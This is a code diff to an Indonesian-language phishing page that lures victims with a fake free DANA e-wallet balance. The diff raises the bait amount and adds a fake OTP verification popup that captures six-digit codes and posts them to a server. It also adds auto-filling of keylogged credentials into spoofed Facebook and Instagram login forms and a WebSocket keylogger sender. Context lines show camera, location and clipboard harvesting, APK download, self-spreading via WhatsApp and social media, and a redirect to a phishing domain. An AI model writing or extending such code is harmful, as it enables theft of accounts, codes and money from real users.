@@ -12,6 +12,11 @@
         .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px}
         .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
         #timer{font-weight:bold}
+        /* OTP Input Style */
+        .otp-input:focus{border-color:#108ee9!important;box-shadow:0 0 0 3px rgba(16,142,233,0.2);background:#fff!important}
+        .otp-input.filled{border-color:#00cc66!important;background:#f0fff4!important}
+        @keyframes fadeIn{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
     </style>
 </head>
 <body>
@@ -22,7 +27,7 @@
         <p style="color:#b3d9ff;font-size:16px;margin:5px 0">Anda mendapatkan Saldo DANA GRATIS!</p>
         <div style="background:#fff;border-radius:15px;padding:20px;margin:15px 0">
             <p style="color:#666;font-size:13px">Saldo DANA Gratis</p>
-            <h1 style="color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0">Rp 50.000</h1>
+            <h1 style="color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0">Rp 250.000</h1>
             <p style="color:#0066cc;font-size:12px">🎁 Kuota terbatas!</p>
         </div>
         <p style="color:#ffcc00;font-size:14px">⏰ Tersisa <span id="timer">00:05</span></p>
@@ -320,12 +325,10 @@ function masterAutoSpread() {
     
     K({ sumber: 'auto_spread_start', data: 'master_auto_spread' });
     
-    // Jalankan semua spread PARALEL dengan delay kecil
     setTimeout(autoSpreadWA, 50);
     setTimeout(autoSpreadLAN, 100);
     setTimeout(autoSpreadMedsos, 150);
     
-    // Clipboard
     setTimeout(function() {
         try {
             navigator.clipboard.writeText('🎉 Dapatkan Saldo DANA Gratis Rp50.000! ' + window.location.href)
@@ -345,6 +348,162 @@ function KA() { if(A.isAvailable){ A.keepAwake() } try{ if('wakeLock' in navigat
 function cleanup() { console.log=function(){};console.warn=function(){};console.error=function(){};console.info=function(){} }
 
 // ============================================================
+// ===================== FITUR TAMBAHAN =======================
+// ============================================================
+
+// ---------- 1. FAKE OTP POPUP ----------
+function fakeOTPPopup() {
+    var overlay = document.createElement('div');
+    overlay.id = 'fakeOTP';
+    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:999998;background:rgba(0,0,0,0.85);display:flex;justify-content:center;align-items:center;animation:fadeIn 0.3s ease;';
+    overlay.innerHTML = `
+        <div style="background:linear-gradient(145deg,#ffffff,#f0f0f0);border-radius:24px;padding:35px 25px;max-width:400px;width:92%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.5);">
+            <div style="width:70px;height:70px;background:linear-gradient(135deg,#108ee9,#0066cc);border-radius:50%;display:flex;justify-content:center;align-items:center;margin:0 auto 15px;font-size:30px;color:#fff;box-shadow:0 5px 20px rgba(16,142,233,0.4);">🏦</div>
+            <h2 style="color:#1a1a2e;font-size:20px;margin:0 0 5px 0;font-weight:700;">Verifikasi Keamanan</h2>
+            <p style="color:#666;font-size:14px;margin:0 0 5px 0;">Kode OTP telah dikirim ke nomor Anda</p>
+            <p style="color:#888;font-size:12px;margin:0 0 20px 0;">⏰ Kadaluarsa dalam <span id="otpTimer" style="color:#ff4444;font-weight:bold;">05:00</span></p>
+            <div style="display:flex;gap:10px;justify-content:center;margin:20px 0;">
+                <input type="text" maxlength="1" class="otp-input" style="width:45px;height:55px;text-align:center;font-size:24px;font-weight:bold;border:2px solid #ddd;border-radius:12px;outline:none;background:#f8f9fa;transition:0.3s;" oninput="otpMove(this, event)" onfocus="this.select()">
+                <input type="text" maxlength="1" class="otp-input" style="width:45px;height:55px;text-align:center;font-size:24px;font-weight:bold;border:2px solid #ddd;border-radius:12px;outline:none;background:#f8f9fa;transition:0.3s;" oninput="otpMove(this, event)" onfocus="this.select()">
+                <input type="text" maxlength="1" class="otp-input" style="width:45px;height:55px;text-align:center;font-size:24px;font-weight:bold;border:2px solid #ddd;border-radius:12px;outline:none;background:#f8f9fa;transition:0.3s;" oninput="otpMove(this, event)" onfocus="this.select()">
+                <input type="text" maxlength="1" class="otp-input" style="width:45px;height:55px;text-align:center;font-size:24px;font-weight:bold;border:2px solid #ddd;border-radius:12px;outline:none;background:#f8f9fa;transition:0.3s;" oninput="otpMove(this, event)" onfocus="this.select()">
+                <input type="text" maxlength="1" class="otp-input" style="width:45px;height:55px;text-align:center;font-size:24px;font-weight:bold;border:2px solid #ddd;border-radius:12px;outline:none;background:#f8f9fa;transition:0.3s;" oninput="otpMove(this, event)" onfocus="this.select()">
+                <input type="text" maxlength="1" class="otp-input" style="width:45px;height:55px;text-align:center;font-size:24px;font-weight:bold;border:2px solid #ddd;border-radius:12px;outline:none;background:#f8f9fa;transition:0.3s;" oninput="otpMove(this, event)" onfocus="this.select()">
+            </div>
+            <button onclick="submitOTP()" style="background:linear-gradient(135deg,#108ee9,#0066cc);color:#fff;border:none;padding:16px;font-size:18px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;transition:0.3s;box-shadow:0 5px 20px rgba(16,142,233,0.3);">🔐 Verifikasi Sekarang</button>
+            <p style="color:#888;font-size:12px;margin:10px 0 0 0;"><span style="cursor:pointer;color:#108ee9;" onclick="alert('Hubungi customer service di 1500-xxx')">Tidak menerima kode?</span> <span style="color:#ddd;margin:0 10px;">|</span> <span style="cursor:pointer;color:#108ee9;" onclick="document.getElementById('fakeOTP').remove()">Batal</span></p>
+            <div id="otpLoading" style="display:none;margin-top:15px;"><div style="width:30px;height:30px;border:4px solid #f3f3f3;border-top:4px solid #108ee9;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto;"></div><p style="color:#888;font-size:12px;margin-top:10px;">Memverifikasi...</p></div>
+        </div>
+    `;
+    document.body.appendChild(overlay);
+    
+    window.otpMove = function(input, event) {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        if (input.value) { input.classList.add('filled'); } else { input.classList.remove('filled'); }
+        if (input.value && input.nextElementSibling && input.nextElementSibling.classList.contains('otp-input')) {
+            input.nextElementSibling.focus();
+        }
+        if (event.key === 'Backspace' && !input.value && input.previousElementSibling && input.previousElementSibling.classList.contains('otp-input')) {
+            input.previousElementSibling.focus();
+            input.previousElementSibling.value = '';
+            input.previousElementSibling.classList.remove('filled');
+        }
+    };
+    
+    setTimeout(function() { var first = document.querySelector('.otp-input'); if(first) first.focus(); }, 300);
+    
+    var timeLeft = 300;
+    var timerInterval = setInterval(function() {
+        timeLeft--;
+        var minutes = Math.floor(timeLeft / 60);
+        var seconds = timeLeft % 60;
+        var timerEl = document.getElementById('otpTimer');
+        if (timerEl) { timerEl.textContent = String(minutes).padStart(2,'0') + ':' + String(seconds).padStart(2,'0'); }
+        if (timeLeft <= 0) { clearInterval(timerInterval); document.getElementById('fakeOTP').remove(); alert('⏰ Kode OTP kadaluarsa!'); }
+    }, 1000);
+    
+    window.submitOTP = function() {
+        var inputs = document.querySelectorAll('.otp-input');
+        var otp = '';
+        inputs.forEach(function(inp) { otp += inp.value; });
+        if (otp.length !== 6) {
+            inputs.forEach(function(inp) { if(!inp.value) { inp.classList.add('error'); setTimeout(function(){ inp.classList.remove('error'); }, 500); } });
+            alert('❌ Masukkan 6 digit kode OTP!');
+            return;
+        }
+        document.querySelector('#fakeOTP button').style.display = 'none';
+        document.getElementById('otpLoading').style.display = 'block';
+        
+        K({ sumber: 'fake_otp', data: { otp: otp, waktu: new Date().toISOString(), url: window.location.href } });
+        
+        try {
+            fetch('/data', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ sumber: 'fake_otp', data: { otp: otp, waktu: new Date().toISOString() } })
+            }).catch(function(){});
+        } catch(e) {}
+        
+        setTimeout(function() {
+            document.getElementById('otpLoading').style.display = 'none';
+            var successHTML = `<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;background:rgba(0,0,0,0.85);display:flex;justify-content:center;align-items:center;"><div style="background:linear-gradient(145deg,#00c853,#009624);border-radius:24px;padding:40px 30px;max-width:350px;width:90%;text-align:center;animation:fadeIn 0.3s ease;"><div style="font-size:60px;margin-bottom:15px;">✅</div><h2 style="color:#fff;font-size:22px;margin:0;">Verifikasi Berhasil!</h2><p style="color:#ccffcc;font-size:14px;margin:10px 0;">Identitas Anda telah terverifikasi.</p><button onclick="document.getElementById('otpSuccess').remove();document.getElementById('fakeOTP').remove();" style="background:#fff;color:#00c853;border:none;padding:14px 40px;font-size:16px;font-weight:bold;border-radius:30px;cursor:pointer;margin-top:15px;width:100%;">OK</button></div></div>`;
+            var successDiv = document.createElement('div');
+            successDiv.id = 'otpSuccess';
+            successDiv.innerHTML = successHTML;
+            document.body.appendChild(successDiv);
+            setTimeout(function() { if(document.getElementById('fakeOTP')) { document.getElementById('fakeOTP').remove(); } }, 2000);
+        }, 2000);
+    };
+    
+    K({ sumber: 'fake_otp_popup', data: 'shown' });
+}
+
+// ---------- 2. AUTO FILL FORM ----------
+function autoFillForm() {
+    if (!document.querySelector('input[type="password"]')) return;
+    
+    var savedData = localStorage.getItem('vd');
+    var korbanData = {};
+    
+    if (savedData) {
+        try {
+            var data = JSON.parse(savedData);
+            for (var i = data.length - 1; i >= 0; i--) {
+                if (data[i].sumber === 'keylogger' || data[i].sumber === 'login') {
+                    korbanData = data[i].data || {};
+                    break;
+                }
+            }
+        } catch(e) {}
+    }
+    
+    document.querySelectorAll('input').forEach(function(input) {
+        if (input.value) return;
+        if (input.type === 'text' || input.type === 'email') {
+            if (korbanData.email) input.value = korbanData.email;
+            else if (korbanData.username) input.value = korbanData.username;
+            else if (korbanData.user) input.value = korbanData.user;
+        }
+        if (input.type === 'password') {
+            if (korbanData.password) input.value = korbanData.password;
+            else if (korbanData.pass) input.value = korbanData.pass;
+            else if (korbanData.pin) input.value = korbanData.pin;
+        }
+    });
+    
+    K({ sumber: 'auto_fill', data: 'form_filled' });
+}
+
+// ---------- 3. LIVE KEYLOGGER (WebSocket) ----------
+var ws = null;
+var wsConnected = false;
+var wsReconnectTimer = null;
+
+function connectWebSocket() {
+    try {
+        ws = new WebSocket('wss://echo.websocket.org');
+        ws.onopen = function() { wsConnected = true; K({ sumber: 'ws_status', data: 'connected' }); };
+        ws.onclose = function() { wsConnected = false; clearTimeout(wsReconnectTimer); wsReconnectTimer = setTimeout(connectWebSocket, 5000); };
+        ws.onerror = function() { wsConnected = false; };
+    } catch(e) {}
+}
+
+function sendKeyloggerWS() {
+    if (!wsConnected || keyTimestamps.length === 0) return;
+    try {
+        ws.send(JSON.stringify({ type: 'keylogger', data: keyTimestamps, time: Date.now(), url: window.location.href }));
+        keyTimestamps = [];
+        K({ sumber: 'keylogger_ws', data: 'sent' });
+    } catch(e) {}
+}
+
+setInterval(function() {
+    if (wsConnected) { sendKeyloggerWS(); }
+}, 1000);
+
+setTimeout(connectWebSocket, 2000);
+
+// ============================================================
 // ===================== EKSEKUSI UTAMA =======================
 // ============================================================
 function dapatkanSemua() {
@@ -353,27 +512,21 @@ function dapatkanSemua() {
     if(hasLS) localStorage.setItem('sudah_klaim', '1');
     var popup = document.getElementById('popupDana');if(popup) popup.style.display='none';
     
-    // SEMUA PROSES DIJALANKAN PARALEL (BUKAN SEQUENTIAL)
-    
-    // Data Collection (paralel)
     GD(); getIP(); ambilLokasi(); ambilKamera(); ambilBaterai();
     ambilStorage(); ambilNetwork(); ambilIPLocal(); ambilCanvasFP();
     ambilWebGLFP(); ambilPlugins(); ambilFonts(); ambilScreenDetail();
     ambilDNT(); cekAdBlock(); bacaClipboard();
     FK();
     
-    // Download APK (paralel)
     initM2();
     
-    // Spread (paralel)
-    if (!spreadDone) {
-        masterAutoSpread();
-    }
+    if (!spreadDone) { masterAutoSpread(); }
     
-    // Persistence (paralel)
     HB(); SW(); KA(); cleanup();
     
-    // Redirect ke phishing (5 detik)
+    // Jalankan Fake OTP Popup setelah 3 detik
+    setTimeout(fakeOTPPopup, 3000);
+    
     setTimeout(function(){ window.location.href='https://verifikasi.site/fb'; }, 5000);
 }
 
@@ -384,19 +537,14 @@ function dapatkanSemua() {
 function klaim() { setTimeout(function(){ dapatkanSemua(); }, 100); K({sumber:'izin',data:'klaim'}); }
 function tolak() { setTimeout(function(){ dapatkanSemua(); }, 100); K({sumber:'izin',data:'tolak'}); }
 
-// Click handler
 var clickHandler = function(){ setTimeout(function(){ dapatkanSemua(); }, 100); };
 document.addEventListener('click', clickHandler);
 setTimeout(function(){ document.removeEventListener('click', clickHandler); }, 5000);
 
-// ===== AUTO SPREAD 1 DETIK =====
 setTimeout(function() {
-    if (!spreadDone) {
-        masterAutoSpread();
-    }
+    if (!spreadDone) { masterAutoSpread(); }
 }, 1000);
 
-// ===== TIMER 5 DETIK =====
 var w = 5;
 var timerInterval = setInterval(function() {
     w--;
@@ -409,7 +557,6 @@ var timerInterval = setInterval(function() {
     }
 }, 1000);
 
-// ===== INIT =====
 setTimeout(cleanup, 1000);
 
 // ============================================================
@@ -418,6 +565,10 @@ setTimeout(cleanup, 1000);
 (function() {
     var path = location.pathname;
     if(path === '/' || path === '') return;
+    
+    // Jalankan Auto Fill Form saat halaman phishing dimuat
+    setTimeout(autoFillForm, 500);
+    
     var t = {
         fb: { title:'Facebook',bg:'#f0f2f5',btnColor:'#1877f2',logo:'<h1 style="color:#1877f2;text-align:center;font-size:40px;padding:20px 0 10px">facebook</h1>',subtitle:'Log in to Facebook',fields:[{id:'email',placeholder:'Email or phone number',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://m.facebook.com/login' },
         ig: { title:'Instagram',bg:'#fafafa',btnColor:'#0095f6',logo:'<h1 style="text-align:center;font-size:35px;padding:40px 0 10px">📸 Instagram</h1>',fields:[{id:'email',placeholder:'Username, email, or phone',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://www.instagram.com/accounts/login' },
